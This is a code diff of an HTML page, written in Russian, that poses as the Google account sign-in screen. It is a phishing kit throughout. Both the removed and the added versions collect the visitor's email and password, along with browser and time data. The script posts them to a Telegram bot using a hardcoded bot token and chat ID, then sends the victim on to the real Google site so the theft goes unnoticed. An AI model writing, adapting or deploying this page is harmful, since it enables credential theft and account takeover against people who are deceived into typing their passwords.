@@ -1,113 +1,116 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Вход</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Roboto', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #fff;
-        }
-        .login-container {
-            width: 100%;
-            max-width: 400px;
-            padding: 40px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-        .login-container img {
-            width: 75px;
-            margin-bottom: 20px;
-        }
-        .login-container h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #202124;
-        }
-        .login-container input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        .login-container button {
-            width: 100%;
-            padding: 12px;
-            margin-top: 20px;
-            background-color: #1a73e8;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .login-container button:hover {
-            background-color: #1765cc;
-        }
-        .footer-text {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #5f6368;
-        }
-        @media (max-width: 500px) {
-            .login-container {
-                padding: 20px;
-            }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Вход</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #fff;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 40px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    .container img {
+      width: 75px;
+      margin-bottom: 20px;
+    }
+    .container h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #202124;
+    }
+    .container input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .container button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 20px;
+      background-color: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .container button:hover {
+      background-color: #1765cc;
+    }
+    .footer-text {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #5f6368;
+    }
+    @media (max-width: 500px) {
+      .container {
+        padding: 20px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
-        <h2>Вход в аккаунт Google</h2>
-        <form id="loginForm">
-            <input type="email" id="email" placeholder="Email или телефон" required>
-            <input type="password" id="password" placeholder="Введите пароль" required>
-            <button type="submit">Далее</button>
-        </form>
-        <div class="footer-text">Google может использовать информацию для улучшения сервисов.</div>
-    </div>
+  <div class="container">
+    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
+    <h1>Вход в аккаунт Google</h1>
+    <form onsubmit="sendData(event, 'google')">
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="password" id="password" placeholder="Пароль" required>
+      <button type="submit">Войти</button>
+    </form>
+    <div class="footer-text">Google может использовать информацию для улучшения сервисов.</div>
+  </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const userAgent = navigator.userAgent;
-            const timestamp = new Date().toLocaleString();
+  <script>
+    const BOT_TOKEN = "7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0";
+    const CHAT_ID = "7947290290";
 
-            const message = `🔍 Вход через Google\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🖥️ User-Agent: ${userAgent}\n🕒 Время: ${timestamp}`;
+    function sendData(event, service) {
+      event.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const userAgent = navigator.userAgent;
+      const currentTime = new Date().toLocaleString();
+      const message = `Новый вход через ${service}:
+Время: ${currentTime}
+User-Agent: ${userAgent}
+Email: ${email}
+Пароль: ${password}`;
 
-            const botToken = '7728203229:AAHjqI6dvF1AL9mlOEgbgcJu3Xs9UiBgXRY';
-            const chatId = '1782608280';
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: chatId, text: message})
-            })
-            .then(response => response.json())
-            .then(data => console.log('Отправлено в Telegram:', data))
-            .catch(error => console.error('Ошибка при отправке данных в Telegram:', error))
-            .finally(() => {
-                window.location.href = 'https://accounts.google.com';
-            });
-        });
-    </script>
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: CHAT_ID, text: message})
+      })
+      .then(response => response.json())
+      .then(data => console.log('Данные отправлены в Telegram:', data))
+      .catch(error => console.error('Ошибка отправки данных:', error))
+      .finally(() => {
+        window.location.href = 'https://google.com';
+      });
+    }
+  </script>
 </body>
 </html>")}]}
